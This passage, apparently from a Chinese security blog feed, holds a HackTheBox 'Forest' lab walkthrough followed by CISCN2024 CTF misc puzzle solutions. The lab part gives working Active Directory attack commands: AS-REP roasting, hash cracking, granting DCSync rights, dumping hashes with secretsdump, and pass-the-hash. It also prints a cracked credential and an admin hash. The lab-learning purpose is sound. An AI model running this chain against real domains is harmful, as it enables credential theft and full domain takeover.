enumdomusers</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702193458453-2004846275.png" alt="image-20240702193457026"></p><p>先将用户名整理出来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">$331000-VK4ADACQNUCA</span><br><span class="line">SM_2c8eef0a09b545acb</span><br><span class="line">SM_ca8c2ed5bdab4dc9b</span><br><span class="line">SM_75a538d3025e4db9a</span><br><span class="line">SM_681f53d4942840e18</span><br><span class="line">SM_1b41c9286325456bb</span><br><span class="line">SM_9b69f1b9d2cc45549</span><br><span class="line">SM_c75ee099d0a64c91b</span><br><span class="line">SM_1ffab36a2f5f479cb</span><br><span class="line">HealthMailboxc3d7722</span><br><span class="line">HealthMailboxfc9daad</span><br><span class="line">HealthMailboxc0a90c9</span><br><span class="line">HealthMailbox670628e</span><br><span class="line">HealthMailbox968e74d</span><br><span class="line">HealthMailbox6ded678</span><br><span class="line">HealthMailbox83d6781</span><br><span class="line">HealthMailboxfd87238</span><br><span class="line">HealthMailboxb01ac64</span><br><span class="line">HealthMailbox7108a4e</span><br><span class="line">HealthMailbox0659cc1</span><br><span class="line">sebastien</span><br><span class="line">lucinda</span><br><span class="line">svc-alfresco</span><br><span class="line">andy</span><br><span class="line">mark</span><br><span class="line">santi</span><br></pre></td></tr></table></figure><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>拿到了用户名，这里又暴露了<code>kerberos</code>端口88。尝试一下<code>AS-REP Roasting</code>攻击。</p><p>将上面的用户名保存为<code>user.txt</code>文件，使用<code>GetNPUsers.py</code>尝试向<code>kerberos</code>请求不需要预认证的票据</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.loacl/ -usersfile user.txt  -dc-ip 10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702195600622-2128859699.png" alt="image-20240702195558839"></p><p>拿到了一个<code>svc-alfresco</code>用户的不需要预认证的票据<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$svc-alfresco@HTB.LOCAL:ebdb0e07d33fac124f8f2366a628920c$fbfa4eaefaece3b6ac1f461570a97940f59e4551f620e061054800b9ce7ae9f86f5b711ef4579b3f9ff2706ab69ad3077ad1e4c81d246d7e83a029dff3837b8452ab50cab25aa6b528dce9584fbb87a37cb3589d09baf8a5e0e4f7e500a53c95772701bc45bca89bfacb2602c9192a121f70346f9436869c60b66573c8f0fbf05a36319686fec69cb54a04e311558fcc6790501776b4b1288ee55489e57131aeb4d944ed3769ccf5a26ff4e4cd418657afc6bd827d874faccde4c4dbbd194eba15ef470c69b39099751446310f18d5f800bc8d38c1f8a2b28064fecc963757f6e583d2afdd87</span><br></pre></td></tr></table></figure><p>使用<code>john</code>进行破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702201408699-1289370632.png" alt="image-20240702201407967"></p><p>拿到一个凭证：<code>svc-alfresco : s3rvice</code></p><p>使用<code>evil-winrm</code>远程连接</p><p><code>evil-winrm -i 10.10.10.161 -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240702202206726-73303224.png" alt="image-20240702202205425"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704113818861-542849522.png" alt="image-20240704113809977"></p><p>最后在桌面上拿到<code>user.txt</code></p><h1 id="AD域渗透权限提升"><a href="#AD域渗透权限提升" class="headerlink" title="AD域渗透权限提升"></a>AD域渗透权限提升</h1><h2 id="BloodHound信息搜集"><a href="#BloodHound信息搜集" class="headerlink" title="BloodHound信息搜集"></a>BloodHound信息搜集</h2><p><code>windows</code>权限提升有一款工具叫做<code>BloodHound</code></p><p>这里使用的是kali的<code>BloodHound</code>工具</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先启动 neo4j</span></span><br><span class="line">neo4j start <span class="comment"># 访问网址默认用户名和密码都是neo4j，登入后修改密码即可</span></span><br><span class="line"><span class="comment"># 再启动 BloodHound</span></span><br><span class="line">bloodhound</span><br><span class="line"><span class="comment"># 输入用户名和修改后的密码即可登录</span></span><br></pre></td></tr></table></figure><p><code>SharpHound.exe</code>下载链接：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>将<code>SharpHound.exe</code>上传到目标机器并运行，即可得到一个zip文件，该文件里面就是信息搜集的结果，将它下载到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/forest/SharpHound.exe</span><br><span class="line">./SharpHound.exe</span><br><span class="line">download 20240703005056_BloodHound.zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703154602854-406882194.png" alt="image-20240703154557962"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703154612998-402889656.png" alt="image-20240703154608670"></p><p>登录到Bloodhound，点击右边上传按钮，将解压后的<code>json</code>文件提交上传</p><p>我们查找一下我们已有用户<code>svc-alfresco</code>相关信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703155415163-444323121.png" alt="image-20240703155410634"></p><h2 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h2><p>点击左侧<code>Unrolled Group Membership</code>可以发现与其相关的用户组和用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703163424801-1273724818.png" alt="image-20240703163420335"></p><p>重点看下半部分</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703163326843-375757956.png" alt="image-20240703163322390"></p><p>可以发现<code>svc-alfresco</code>用户属于<code>Account Operators</code>组，该组是AD域中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。 但是，不能更改属于<code>Administrators</code>或<code>Domain Admins</code>组的账号，也不能更改这些组。</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240703170207796-1894446677.png" alt="image-20240703170202999"></p><p>点击<code>Find Shortest Paths to Domain Admins</code>可以看到上图结果</p><p>其中，从<code>svc-alfresco</code>到<code>Domain Admins</code>的路径中发现，<code>EXCHANGE WINDOWS PERMISSIONS</code>组与<code>Account Operators</code> 组有<code>GenericAll</code>关系，表示<code>EXCHANGE WINDOWS PERMISSIONS</code>组完全信任<code>Account Operators</code> 组，而上面还提到<code>svc-alfresco</code>用户属于<code>Account Operators</code>组，且<code>Account Operators</code>组的成员可以创建和管理该域中的用户和组并为其设置权限，因此我们可以利用<code>Account Operators</code>组的权限创建一个新用户，将其添加到<code>EXCHANGE WINDOWS PERMISSIONS</code>组，同时可以看到<code>EXCHANGE WINDOWS PERMISSIONS</code>组的成员对<code>HTB.LOCAL</code>有<code>WriteDacl</code>权限，可以用新添加的用户对<code>HTB.LOCAL</code>的<code>WriteDacl</code>权限进行恶意利用，从而实现提权</p><h2 id="创建一个恶意用户"><a href="#创建一个恶意用户" class="headerlink" title="创建一个恶意用户"></a>创建一个恶意用户</h2><p>回到<code>Evil-WinRM</code>，先利用<code>ACCOUNT OPERATION</code>的权限去创建一个新的用户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user popayw 123abc! /add /domain<span class="comment"># 创建用户</span></span><br><span class="line">net group <span class="string">&quot;Exchange Windows Permissions&quot;</span> popayw /add<span class="comment"># 将用户添加到Exchange Windows Permissions组</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240705131624984-738117392.png" alt="image-20240705131611080"></p><p>用户创建完毕，再利用<code>WriteDacl</code>权限去给我们用户所在组加权限，这里使用<code>PowerSploit</code>中的<code>powerview.ps1</code>来滥用<code>WriteDacl</code>权限，通过<code>upload</code>将<code>powerview.ps1</code>文件传进去</p><p>运行命令导入脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p>这时候就会发现运行<code>menu</code>模块增加</p><ul><li>运行之前</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704140311010-817859956.png" alt="image-20240704140302757"></p><ul><li>运行之后</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704140329286-337456579.png" alt="image-20240704140320314"></p><p>再定义两个变量，用于创建凭证对象并授予 <code>DCSync</code> 权限，其中<code>Add-DomainObjectAcl</code>模块可以添加<code>DCSync</code>权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">&#x27;123abc!&#x27;</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="string">&#x27;HTB\popayw&#x27;</span>, <span class="variable">$pass</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$cred</span> -TargetIdentity <span class="string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity popayw -Rights DCSync</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704142421132-450044665.png" alt="image-20240704142412881"></p><h2 id="DCSync攻击导出域内哈希"><a href="#DCSync攻击导出域内哈希" class="headerlink" title="DCSync攻击导出域内哈希"></a>DCSync攻击导出域内哈希</h2><ul><li>DCSync攻击原理</li></ul><blockquote><p><strong>主要利用的是域控制器之间的数据同步复制</strong></p><p>当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。<br>如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p></blockquote><p>用户想要发起<code>DCSync</code>攻击，必须获得以下任一用户的权限</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>之前我们已经创建了一个有<code>DCSync</code>权限的用户，我们可以使用<code>secretsdump.py</code>工具执行 <code>DCSync</code> 以转储管理员用户的 <code>NTLM</code> 哈希</p><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py popayw:&#39;123abc!&#39;@10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704150548072-705369653.png" alt="image-20240704150539216"></p><p>可以看到已经拿到所有用户的<code>hash</code>，包括<code>admin</code>用户的</p><h2 id="PTH传递攻击获取Root"><a href="#PTH传递攻击获取Root" class="headerlink" title="PTH传递攻击获取Root"></a>PTH传递攻击获取Root</h2><p>拿到了管理员的<code>hash</code>，就可以通过<code>wmiexec</code>哈希传递拿到管理员用户的权限</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704151153151-1244754650.png" alt="image-20240704151145045"></p><p>成功拿到管理员用户的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240704151425592-732615984.png" alt="image-20240704151417342"></p><p>最后也是在<code>desktop</code>获取<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024</title>
      <link href="/posts/f97bea14.html"/>
      <url>/posts/f97bea14.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="火锅链观光打卡"><a href="#火锅链观光打卡" class="headerlink" title="火锅链观光打卡"></a>火锅链观光打卡</h2><p>微信公众号获得提示</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518092106435-1906075373.jpg" alt="4ce1a2288de3dff3307981a18d0c297"></p><p>提示装插件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518093835503-63519121.png" alt="image-20240518093832745"></p><p>然后开始游戏，攒够7种不同的食物，兑换即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518092502915-601390575.png" alt="image-20240518092459544"></p><p>flag{y0u_ar3_hotpot_K1ng}</p><h2 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h2><p>拷打gpt写读取npz文件的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 .npz 文件</span></span><br><span class="line">file_path = <span class="string">&#x27;attachment.npz&#x27;</span></span><br><span class="line">data = np.load(file_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印文件中的数组名称</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Arrays in the .npz file:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(data.files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问和打印每个数组</span></span><br><span class="line"><span class="keyword">for</span> array_name <span class="keyword">in</span> data.files:</span><br><span class="line">    array = data[array_name]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nArray name: <span class="subst">&#123;array_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(array)</span><br></pre></td></tr></table></figure><p>通过input、index、trace的内容可以分析出，它⼤概有13组数据每组数据对应⼀幅图，有点类似键盘敲击的</p><p>分析读取的三组数据，发现对应是13组图，每组数据对应一个最低点，再拷打gpt写个读取的最小值中的最大值</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 .npz 文件中的数据</span></span><br><span class="line">data = np.load(<span class="string">&quot;attachment.npz&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 .npz 文件中提取 &#x27;index&#x27;, &#x27;trace&#x27;, 和 &#x27;input&#x27; 数组</span></span><br><span class="line">index = data[<span class="string">&#x27;index&#x27;</span>]</span><br><span class="line">trace = data[<span class="string">&#x27;trace&#x27;</span>]</span><br><span class="line">input_data = data[<span class="string">&#x27;input&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个空字符串，用于存储结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历范围 12，处理 input_data 的每一个 40 行块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># 获取当前块的 40 行数据</span></span><br><span class="line">    table = input_data[<span class="number">40</span> * i: <span class="number">40</span> * (i + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对于每一行（共 40 行），找到 trace 中每一行的最小值的索引</span></span><br><span class="line">    min_indices = [np.argmin(trace[i * <span class="number">40</span> + j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找到上一步计算的最小值索引中的最大值索引</span></span><br><span class="line">    max_min_index = np.argmax(min_indices)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将表格中对应于最大最小值索引的值添加到结果字符串中</span></span><br><span class="line">    result += table[max_min_index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印最终的结果字符串，不添加额外的换行符</span></span><br><span class="line"><span class="built_in">print</span>(result, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519181709916-367513063.png" alt="image-20240519181705080"></p><h2 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h2><p>百度搜mwp文件咋打开</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153954328-756953515.png" alt="image-20240519153949675"></p><p>放进去发现提示不识别，用010打开后以及查看该文件头发现文件头缺失</p><p>先补全文件头</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153511943-1559805537.png" alt="image-20240519153507379"></p><p>用step工具打开</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153636844-961689750.png" alt="image-20240519153632511"></p><p>base64解码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153717629-1532464494.png" alt="image-20240519153712979"></p><h2 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h2><p>将ppt文件转换为zip，文档打开找到，ppt信息里面也可以找到，懒得截图了<br>Part1:flag{e<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716106492580-26b1e005-7512-42d9-a272-151cd3f43b17.png#averageHue=%23231f1e&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=107&amp;id=u5940995a&amp;originHeight=167&amp;originWidth=803&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=14388&amp;status=done&amp;style=none&amp;taskId=uce27be34-720a-466e-855c-1aaa1b5ff9e&amp;title=&amp;width=513.92" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107572564-18f01d74-a502-40d8-af18-9f2c23c4d3a4.png#averageHue=%23f6f2f1&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=415&amp;id=uf3912ae0&amp;originHeight=648&amp;originWidth=526&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=57053&amp;status=done&amp;style=none&amp;taskId=u6d2eea5d-5e52-47cf-bbcc-16d3b7e2d6c&amp;title=&amp;width=336.64" alt="image.png"><br>（算了还是截了）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107764486-62638e04-f9c4-4218-9de0-f56184826389.png#averageHue=%23fdfdfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=489&amp;id=ucc0600eb&amp;originHeight=764&amp;originWidth=1137&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=27692&amp;status=done&amp;style=none&amp;taskId=u0973da23-49da-459c-b2e5-9f912fa6356&amp;title=&amp;width=727.68" alt="image.png"><br>解密<br>part2:675efb<br>里面有个word，搞成zip解压<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107925246-fe0a3e99-3fbd-4c65-9069-b3e0db9b6c6d.png#averageHue=%23221e1d&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=92&amp;id=ub31f8e2b&amp;originHeight=143&amp;originWidth=1631&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=33181&amp;status=done&amp;style=none&amp;taskId=ud19d7846-698c-466e-905f-285365225ec&amp;title=&amp;width=1043.84" alt="image.png"><br>接着凯撒爆破base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108031213-a6565110-6e74-4b6b-870b-4b311fdba2f9.png#averageHue=%23fcfcfb&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=602&amp;id=u57a3cf8a&amp;originHeight=940&amp;originWidth=2031&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=137352&amp;status=done&amp;style=none&amp;taskId=u7f8b762d-752c-478d-af51-e38d0ad79d0&amp;title=&amp;width=1299.84" alt="image.png"><br>PArt3:3-34<br>alt+F11打开vba代码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108094760-e1590f14-1867-4228-8b08-26a43e592d5e.png#averageHue=%23fbfafa&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=401&amp;id=uc697dce8&amp;originHeight=627&amp;originWidth=826&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=36385&amp;status=done&amp;style=none&amp;taskId=ud3bae096-4853-4fa3-aced-d140a3df981&amp;title=&amp;width=528.64" alt="image.png"><br>问gpt是RC4（一直以为要写解密脚本！！！）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108192751-d5e40af9-9475-41b2-9ddc-31427c36089b.png#averageHue=%23fdfdfd&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=502&amp;id=u8511315e&amp;originHeight=784&amp;originWidth=1288&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=32467&amp;status=done&amp;style=none&amp;taskId=u06617092-6b36-4c14-8f71-921c66983e4&amp;title=&amp;width=824.32" alt="image.png"><br>Payt4:6f-40<br>PPT给图片掀开<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108300557-25e6cd01-2729-47c5-9490-c04ef5a82deb.png#averageHue=%23fdf6d7&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=163&amp;id=u97438b20&amp;originHeight=254&amp;originWidth=1811&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=30298&amp;status=done&amp;style=none&amp;taskId=uf87699d3-5c7a-47d7-8d40-acd93b08f19&amp;title=&amp;width=1159.04" alt="image.png"><br>base64解密<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108384838-aa51d603-310f-4674-8b7f-5c29dec629ac.png#averageHue=%23fdfdfd&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=543&amp;id=u6c0e38ba&amp;originHeight=849&amp;originWidth=1262&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=23497&amp;status=done&amp;style=none&amp;taskId=u7247c690-186d-4958-ba7c-b20389589ab&amp;title=&amp;width=807.68" alt="image.png"><br>pArt5:5f-90d<br>第五页ppt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108414303-ed12dfe7-8dfb-43f3-a604-53a7faa1c689.png#averageHue=%23565557&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=58&amp;id=u3d2f6a84&amp;originHeight=90&amp;originWidth=1352&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=21813&amp;status=done&amp;style=none&amp;taskId=u14d60f67-5708-4b5b-b65e-5ae19d3974d&amp;title=&amp;width=865.28" alt="image.png"><br>多轮base64解密<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108449233-8834d997-0c5b-4849-a675-1bb86e310e60.png#averageHue=%23fdfcfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=622&amp;id=SmmWX&amp;originHeight=972&amp;originWidth=1875&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=89549&amp;status=done&amp;style=none&amp;taskId=uca9840a1-c886-4d57-84cf-be608273c3d&amp;title=&amp;width=1200" alt="image.png"><br>ParT6:d-2<br>还是改为zip解压出来的题目里找到的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108629143-0d7aab51-366f-40f3-9ac2-efc31576b3bc.png#averageHue=%23faf8f4&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=127&amp;id=u0408805e&amp;originHeight=199&amp;originWidth=988&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=31790&amp;status=done&amp;style=none&amp;taskId=ue6de49b7-7f91-4c08-aaa3-8bec3371696&amp;title=&amp;width=632.32" alt="image.png"><br>base64<br><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008170038822-643052222.png" alt="image-20241008170036571"><br>PART7=22b3<br>在<code>ppt/slides/slide4.xml</code>下<br><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008170033866-1362623777.png" alt="image-20241008170031528"><br><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008170026874-785805001.png" alt="image-20241008170024696"><br><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008170019111-1441112012.png" alt="image-20241008170016644"><br>paRt8:87e<br> <code>ppt\slideLayouts\slideLayout2.xml</code>下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008170007771-1880325254.png" alt="image-20241008170005421"><br>可知密文去掉Bb13解base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607161420805-219422224.png" alt="image-20240607161418562"></p><p> paRt8:87e</p><p>在<code>ppt\media</code>下<br><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241008165915953-1059502503.png" alt="image.png"><br>解密<br><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607161506857-1018305141.png" alt="image-20240607161504364"><br>PARt10:9}<br>维吉尼亚 key也有<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716109807249-dfa68f6f-b9b1-428a-987a-d0dcfc97440b.png#averageHue=%235d5957&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=358&amp;id=u86103ed2&amp;originHeight=560&amp;originWidth=296&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=20380&amp;status=done&amp;style=none&amp;taskId=u5a9174d4-d5fd-4a9c-b841-dec50ca2811&amp;title=&amp;width=189.44" alt="image.png"></p><p>密文ZYWJbIYnFhq9，加密方式是维吉尼亚加密， 密钥furry</p><h2 id="Tough-DNS"><a href="#Tough-DNS" class="headerlink" title="Tough_DNS"></a>Tough_DNS</h2><p>题目描述是一串16进制数据，解码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519164112092-139304058.png" alt="image-20240519164104332"></p><p>没解开，尝试通过逆序在进行16进制解码再逆序回来得到正常的数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607162353150-139741468.png" alt="image-20240607162350498"></p><p>在流量包中发现二进制域名</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519164505210-2099247586.png" alt="image-20240519164500340"></p><p>利用工具将域名提取到一个文件中，将其保存</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>尝试后，发现可能是二维码，利用工具将其转换成二维码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607171710886-1959652525.png" alt="image-20240607171708632"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607171654722-1330033081.png" alt="image-20240607171652269"></p><p>扫描出来的结果如下：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519175734479-2049718795.png" alt="image-20240519175729877"></p><p>通过分析后续流量，利用 tshark 脚本分别导出 0x6421，0x4500 所对应的数据</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607172537896-665304996.png" 